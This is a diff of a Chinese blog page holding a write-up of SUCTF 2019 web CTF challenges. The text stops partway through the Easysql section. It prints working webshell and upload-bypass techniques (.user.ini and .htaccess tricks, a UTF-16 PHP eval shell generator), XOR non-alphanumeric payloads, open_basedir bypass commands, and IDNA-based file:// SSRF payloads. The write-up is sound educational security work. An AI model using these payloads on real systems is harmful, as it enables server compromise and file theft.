@@ -1,75 +1,134 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>SUCTF_2019_部分复现 | Lethe | 忘川</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe's Blog">
-  <meta name="description" content="Lethe's Blog">
-  <script id="hexo-configurations">
-  var CONFIG = {
-    root: '/',
-    theme: 'lx',
-    version: '1.4.5',
-    localsearch:{
-      "enable": false,
-      "trigger": "auto",
-      "top_n_per_article": 1,
-      "unescape": false,
-      "preload": false
-      },
-    path: '-'
-  };
-</script>
+<html lang="">
 
-  <link rel="shortcut icon" href="/hacker.png">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.min.js"></script>
-  <script src="/js/jquery.jside.menu.js"></script>
-	<script>
-	$(document).ready(function(){
-	$(".menu-container").jSideMenu({
-	    jSidePosition: "position-right",
-	    jSideSticky: true,
-	    jSideSkin: "moonlit",
-	     });
-	}); 
-	</script>
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="Lethe&#39;s Blog">
+  <meta name="author" content="Lethe">
+  <meta name="keywords" content="Lethe&#39;s Blog">
+  <title>SUCTF_2019_部分复现 ~ Lethe | 忘川</title>
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+  <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
   
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:300|Noto+Serif+SC&amp;display=swap">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  
+  <link rel="stylesheet" href="/css/main.css">
+
+  
 </head>
+
+
 <body>
-<div class="single">
-<div id="page">
-<div id="lx-aside" style="background-image: url(/images/page-cover.jpg)" data-stellar-background-ratio="0.5">
-  <div class="overlay">
-  <div class="page-title">
-    <div class="avatar"><a href="/"><img src="/images/2.jpg"></a></div>
-    <span>2019-08-26</span>
-    <h2>SUCTF_2019_部分复现</h2>
-    <div class="tags"><i class="fa fa-tag"></i><a class="tag-link" href="/tags/Writeup/">Writeup</a></div>
-    <div class="social-links">
-<a href="https://github.com/LetheSec" target="_blank"><i class="fa fa-github fa-fw"></i></a><a href="mailto:1013579926@qq.com"><i class="fa fa-envelope fa-fw"></i></a>
-</div></div>
-</div>
-</div>
-<div id="lx-main-content">
-  <div class="lx-post">
-    <div class="lx-entry padding">
-      <div>
-        <h1><span id="checkin">CheckIn</span></h1><p>1、进入题目后是一个简单的上传页面：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819172654291.png" alt="在这里插入图片描述"><br>先尝试上传普通的图片马，发现会显示<code>&lt;? in contents!</code>，过滤了<code>&lt;?</code>，可以使用<code>&lt;script language=&#39;php&#39;&gt;&lt;/scrip&gt;</code>绕过。</p>
-<p>修改后再次上传发现显示<code>exif_imagetype:not image!</code>，还用了<code>exif_imagetype()</code>进行检验，可以加上GIF89a进行绕过。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173405352.png" alt="在这里插入图片描述"><br>但是后缀正则过滤了<code>php</code>字符，想直接绕过是没戏了。</p>
-<p>2、于是考虑解析漏洞，发现服务端不是Apache而是Nginx，所以常见的上传<code>.hatcess</code>文件不可行。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173804810.png" alt="在这里插入图片描述"></p>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe | 忘川</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/2.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              <p class="mt-3">Monday, August 26th 2019, 5:59 pm</p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto">
+          <div class="markdown-body">
+            <h1><span id="checkin">CheckIn</span></h1><p>1、进入题目后是一个简单的上传页面：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819172654291.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>先尝试上传普通的图片马，发现会显示<code>&lt;? in contents!</code>，过滤了<code>&lt;?</code>，可以使用<code>&lt;script language=&#39;php&#39;&gt;&lt;/scrip&gt;</code>绕过。</p>
+<p>修改后再次上传发现显示<code>exif_imagetype:not image!</code>，还用了<code>exif_imagetype()</code>进行检验，可以加上GIF89a进行绕过。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173405352.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>但是后缀正则过滤了<code>php</code>字符，想直接绕过是没戏了。</p>
+<p>2、于是考虑解析漏洞，发现服务端不是Apache而是Nginx，所以常见的上传<code>.hatcess</code>文件不可行。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173804810.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>参考这篇文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p>
 <p>php.ini一定很熟悉了，是php中的配置文件，其中提到了.user.ini文件:</p>
-<p>链接：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a><br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174532748.png" alt="在这里插入图片描述"></p>
+<p>链接：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a><br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174532748.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>再看一下文档对于.user.ini文件的解释：</p>
 <p>链接：<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174740478.png" alt="在这里插入图片描述"><br>简单来说，它起的作用和.htaccess文件差不多，可以通过在目录下增加.user.ini文件来修改一些配置，可以通过.user.ini文件设置除了<code>PHP_INI_SYSTEM</code>以外的所有模式的选项，且不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
-<p>下面就找php.ini中可以利用的配置项，如下:<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819175930926.png" alt="在这里插入图片描述"><br>即<code>auto_prepend_file</code>配置项可以指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174740478.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>简单来说，它起的作用和.htaccess文件差不多，可以通过在目录下增加.user.ini文件来修改一些配置，可以通过.user.ini文件设置除了<code>PHP_INI_SYSTEM</code>以外的所有模式的选项，且不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>下面就找php.ini中可以利用的配置项，如下:<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819175930926.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>即<code>auto_prepend_file</code>配置项可以指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</p>
 <p>注：还有一个<code>auto_append_file</code>选项，是在解析后进行包含。</p>
 <p>利用这两个配置项进行包含的前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
 <p>4、利用上述配置项进行包含的前提是：含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
@@ -83,10 +142,10 @@
 <p>#define test_width 16</p>
 <p>#define test_height 7</p>
 </blockquote>
-<p>5、成功上传.user.ini文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182711392.png" alt="在这里插入图片描述"></p>
-<p>接下来上传包含一句话木马的jpg文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182830861.png" alt="在这里插入图片描述"></p>
+<p>5、成功上传.user.ini文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182711392.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>接下来上传包含一句话木马的jpg文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182830861.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>这样我们上传的文件就被包含在同目录的那个index.php中了，然后连接此文件即可。</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082723380334.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082723380334.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="easyphp">EasyPHP</span></h1><p>1、进入题目后，源码显示在了页面上：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -95,140 +154,242 @@
 <p>2、所以接下来要构造payload绕过正则检测并且调用get_the_flag()，这里的过滤非常严格，几乎过滤了所有可见字符，仔细看下这篇文章：<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a>  就懂了如何绕过。</p>
 <p>可以利用不可见字符的异或来构造，脚本如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($argv[<span class="number">1</span>]);$i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);  <span class="comment">//dechex(255) = ff</span></span><br><span class="line">        <span class="keyword">if</span>($k == $argv[<span class="number">1</span>][$i])</span><br><span class="line">            $payload .= <span class="string">'%'</span>.dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>
-<p>得到：<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022295714.png" alt="在这里插入图片描述"></p>
+<p>得到：<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022295714.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>所以尝试:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022373196.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022373196.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>发现成功，于是构造payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag</span><br></pre></td></tr></table></figure>
 <p>3、接下来就是通过上传来getshell了，这里确实是需要上传<code>.htaccess</code>文件了，绕过方式可以参考这篇文章：<a href="https://www.cnblogs.com/wfzWebSecuity/p/11207145.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11207145.html</a></p>
 <ul>
 <li>exif_imagetype() 的绕过方式和上面一样</li>
-<li>这里注意到php版本为7.2所以，不能用<code>&lt;script&gt;</code>标签绕过<code>&lt;?</code>的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022585743.png" alt="在这里插入图片描述"><br>直接利用脚本生成文件：</li>
+<li>这里注意到php版本为7.2所以，不能用<code>&lt;script&gt;</code>标签绕过<code>&lt;?</code>的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022585743.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>直接利用脚本生成文件：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">	phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line"></span><br><span class="line">	phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">	phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">	phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">	htaccess = open(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">	htaccess.write(SIZE_HEADER)</span><br><span class="line">	htaccess.write(<span class="string">b'AddType application/x-httpd-php .lethe\n'</span>)</span><br><span class="line">	htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">	htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">	htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">	htaccess.close()</span><br><span class="line">		</span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"shell.lethe"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>
 <p>然后利用Postman分别构造上传<code>.htaccess</code>和<code>shell.lethe</code>:</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232500140.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232500140.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>得到文件路径后，就可以利用<code>shell.lethe</code>执行命令了，但是还需要绕过<code>open_basedir</code>。</p>
 <p>参考：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener"><br>从PHP底层看open_basedir bypass</a></p>
 <p>于是构造payload如下：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(glob(&#39;*&#39;));</code></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232541683.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232541683.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>得到flag位置后，最后读取flag即可，payload：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(file_get_contents(THis_Is_tHe_F14g));</code></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232651716.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232651716.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="pythonginx">Pythonginx</span></h1><p>进入页面后给了源码：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>
 <p>这题的出题思路来自于今年BlackHat的一个议题，相关PPT如下：<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
-<p>其中关于Python的内容如下：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190826233021605.png" alt="在这里插入图片描述"><br>这里给出altman学长写的一个脚本，用来寻找可用字符：</p>
+<p>其中关于Python的内容如下：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190826233021605.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里给出altman学长写的一个脚本，用来寻找可用字符：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 <p>下面就是寻找利用方式了，根据题目中的提示：</p>
 <ul>
 <li>前面的url部分应该是<code>suctf.cc</code></li>
 <li>还提到了Nginx，Nginx的配置文件目录为：<code>/usr/local/nginx/conf/nginx.conf</code></li>
 </ul>
-<p>跑上述脚本的的时候，其中有一个可利用字符：<br>                <img src="/2019/08/26/SUCTF-2019-部分复现/20190826235708828.png" alt="在这里插入图片描述"><br>由此可以想到构造：<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>（另一种绕过方式是利用<code>ℂ</code>来代替<code>c</code>及进行绕过），这样可以读到flag的位置：</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827000438451.png" alt="在这里插入图片描述"></p>
+<p>跑上述脚本的的时候，其中有一个可利用字符：<br>                <img src="/2019/08/26/SUCTF-2019-部分复现/20190826235708828.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>由此可以想到构造：<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>（另一种绕过方式是利用<code>ℂ</code>来代替<code>c</code>及进行绕过），这样可以读到flag的位置：</p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827000438451.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>最后构造payload：<code>file://suctf.c℆sr/fffffflag</code></p>
 <p><br></p>
 <h1><span id="easysql">Easysql</span></h1><p>（题目好像出现了不少非预期解，而且比赛过程中甚至泄露了源码…）</p>
-<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827224637818.png" alt="在这里插入图片描述"></p>
+<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827224637818.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>根据输入的回显大致判断查询语句为：<code>.. POST[&#39;query&#39;]||flag ...</code></p>
 <p><strong>非预期解</strong></p>
